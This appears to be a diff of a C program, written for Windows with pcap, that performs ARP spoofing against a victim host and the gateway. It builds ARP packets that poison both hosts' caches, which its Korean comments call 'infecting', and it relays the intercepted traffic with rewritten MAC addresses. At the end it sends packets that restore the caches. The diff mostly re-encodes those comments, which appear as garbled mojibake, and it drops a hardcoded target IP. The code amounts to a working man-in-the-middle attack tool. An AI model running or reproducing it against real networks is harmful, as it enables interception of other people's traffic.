@@ -33,7 +33,7 @@ void packetche(const u_char *repacket, int len)
 			vcou++;
 		if (cp[i + 6] == GateMac[i] && cp[i] == MyMac[i])
 			gcou++;
-	}	//vicÄÄÇ»ÅÍ·Î °¡´Â ÆĞÅ¶ÀÎÁö Gateway·Î °¡´Â ÆĞÅ¶ÀÎÁö ±¸ºĞÇÏ±â À§ÇÑ for
+	}	//vicì»´í“¨í„°ë¡œ ê°€ëŠ” íŒ¨í‚·ì¸ì§€ Gatewayë¡œ ê°€ëŠ” íŒ¨í‚·ì¸ì§€ êµ¬ë¶„í•˜ê¸° ìœ„í•œ for
 	if (vcou == 6)
 	{
 		for (i = 0; i < 6; i++)
@@ -48,9 +48,9 @@ void packetche(const u_char *repacket, int len)
 				cp[i] = MyMac[i - 22];
 				cp[i + 10] = GateMac[i - 22];
 			}
-		}//ARP ÆĞÅ¶ÀÏ °æ¿ì ARP Çì´õ ºÎºĞÀÇ Mac ¾îµå·¹½ºµµ ¼öÁ¤
+		}//ARP íŒ¨í‚·ì¼ ê²½ìš° ARP í—¤ë” ë¶€ë¶„ì˜ Mac ì–´ë“œë ˆìŠ¤ë„ ìˆ˜ì •
 		pcap_sendpacket(pickedDev, cp, len);
-	}	//vicÄÄÇ»ÅÍ·Î °¡´Â °ÍÀÏ¶§ µé¾î¿Â ÆĞÅ¶À» ¼öÁ¤ÇÏ¿© º¸³¿
+	}	//vicì»´í“¨í„°ë¡œ ê°€ëŠ” ê²ƒì¼ë•Œ ë“¤ì–´ì˜¨ íŒ¨í‚·ì„ ìˆ˜ì •í•˜ì—¬ ë³´ëƒ„
 	if (gcou == 6)
 	{
 		for (i = 0; i < 6; i++)
@@ -65,9 +65,9 @@ void packetche(const u_char *repacket, int len)
 				cp[i] = MyMac[i - 22];
 				cp[i + 10] = VicMac[i - 22];
 			}
-		}//ARP ÆĞÅ¶ÀÏ °æ¿ì ARP Çì´õ ºÎºĞÀÇ Mac ¾îµå·¹½ºµµ ¼öÁ¤
+		}//ARP íŒ¨í‚·ì¼ ê²½ìš° ARP í—¤ë” ë¶€ë¶„ì˜ Mac ì–´ë“œë ˆìŠ¤ë„ ìˆ˜ì •
 		pcap_sendpacket(pickedDev, cp, len);
-	}//Gateway·Î °¡´Â °ÍÀÏ¶§ µé¾î¿Â ÆĞÅ¶À» ¼öÁ¤ÇÏ¿© º¸³¿
+	}//Gatewayë¡œ ê°€ëŠ” ê²ƒì¼ë•Œ ë“¤ì–´ì˜¨ íŒ¨í‚·ì„ ìˆ˜ì •í•˜ì—¬ ë³´ëƒ„
 }
 DWORD WINAPI con(LPVOID arg)
 {
@@ -103,13 +103,12 @@ int main(int argc, char *argv[])
 	}
 	if (GetAdaptersInfo(pAdapterInfo, &buflen) == NO_ERROR)
 		pAdapter = pAdapterInfo;
-	argv[1] = "192.168.0.6";
 	DestIp = inet_addr(argv[1]);
 	SrcIp = inet_addr(pAdapter->IpAddressList.IpAddress.String);
-	GateIp = inet_addr(pAdapter->GatewayList.IpAddress.String);		//IP °¡Á®¿À±â
+	GateIp = inet_addr(pAdapter->GatewayList.IpAddress.String);		//IP ê°€ì ¸ì˜¤ê¸°
 	SendARP(SrcIp, SrcIp, MyMac, &PhysAddrLen);
 	SendARP(DestIp, SrcIp, VicMac, &PhysAddrLen);
-	SendARP(GateIp, SrcIp, GateMac, &PhysAddrLen);		//Mac ¾îµå·¹½º °¡Á®¿À±â
+	SendARP(GateIp, SrcIp, GateMac, &PhysAddrLen);		//Mac ì–´ë“œë ˆìŠ¤ ê°€ì ¸ì˜¤ê¸°
 	i = 4;
 	while (i--)
 		Vip[i] = GET_HEX(RIGHT_SHIFT(DestIp, i));
@@ -118,7 +117,7 @@ int main(int argc, char *argv[])
 		Sip[i] = GET_HEX(RIGHT_SHIFT(SrcIp, i));
 	i = 4;
 	while (i--)
-		Gip[i] = GET_HEX(RIGHT_SHIFT(GateIp, i));		//IP¸¦ ¹®ÀÚ ¹è¿­¿¡ ÇÏ³ª¾¿ ÀúÀå
+		Gip[i] = GET_HEX(RIGHT_SHIFT(GateIp, i));		//IPë¥¼ ë¬¸ì ë°°ì—´ì— í•˜ë‚˜ì”© ì €ì¥
 	for (i = 0; i < 6; i++)
 	{
 		gipacket[i] = GateMac[j];
@@ -163,28 +162,28 @@ int main(int argc, char *argv[])
 			gipacket[i] = Gip[j];
 			vipacket[i] = Vip[j++];
 		}
-	}				//GateWay¿Í VicÀÇ ÄÄÇ»ÅÍ¸¦ °¨¿°½ÃÅ³ ÆĞÅ¶ »ı¼º
+	}				//GateWayì™€ Vicì˜ ì»´í“¨í„°ë¥¼ ê°ì—¼ì‹œí‚¬ íŒ¨í‚· ìƒì„±
 	if ((pcap_findalldevs(&allDevice, errorMSG)) == -1)
-		printf("ÀåÄ¡ °Ë»ö ¿À·ù");
+		printf("ì¥ì¹˜ ê²€ìƒ‰ ì˜¤ë¥˜");
 	device = allDevice;
 	pickedDev = pcap_open_live(device->name, 65536, 0, 1000, errorMSG);
-	pcap_freealldevs(allDevice);	//µğ¹ÙÀÌ½º¸¦ ºÒ·¯¿È
-	hThread1 = CreateThread(NULL, 0, Infection, NULL, 0, NULL);	//°¨¿°ÆĞÅ¶À» º¸³»´Â ½º·¹µå »ı¼º
-	hThread2 = CreateThread(NULL, 0, con, NULL, 0, NULL); //Á¾·á½ÃÅ³Áö ¸»Áö °Ë»çÇÏ´Â ½º·¹µå »ı¼º
+	pcap_freealldevs(allDevice);	//ë””ë°”ì´ìŠ¤ë¥¼ ë¶ˆëŸ¬ì˜´
+	hThread1 = CreateThread(NULL, 0, Infection, NULL, 0, NULL);	//ê°ì—¼íŒ¨í‚·ì„ ë³´ë‚´ëŠ” ìŠ¤ë ˆë“œ ìƒì„±
+	hThread2 = CreateThread(NULL, 0, con, NULL, 0, NULL); //ì¢…ë£Œì‹œí‚¬ì§€ ë§ì§€ ê²€ì‚¬í•˜ëŠ” ìŠ¤ë ˆë“œ ìƒì„±
 	while (che)
 	{
 		repacket = pcap_next(pickedDev, &header);
 		packetche(repacket, header.len);
 	}
 	CloseHandle(hThread1);
-	CloseHandle(hThread2);	//½º·¹µå Á¾·á
+	CloseHandle(hThread2);	//ìŠ¤ë ˆë“œ ì¢…ë£Œ
 	for (i = 0; i < 6; i++)
 	{
 		gipacket[i + 32] = gipacket[i] = GateMac[i];
 		gipacket[i + 22] = gipacket[i + 6] = VicMac[i];
 		vipacket[i + 32] = vipacket[i] = VicMac[i];
 		vipacket[i + 22] = vipacket[i + 6] = GateMac[i];
-	}	//°¨¿°µÈ°É º¹±¸½ÃÅ³ ÆĞÅ¶ »ı¼º
+	}	//ê°ì—¼ëœê±¸ ë³µêµ¬ì‹œí‚¬ íŒ¨í‚· ìƒì„±
 	pcap_sendpacket(pickedDev, gipacket, sizeof(gipacket));
 	pcap_sendpacket(pickedDev, vipacket, sizeof(vipacket));
 	return 0;
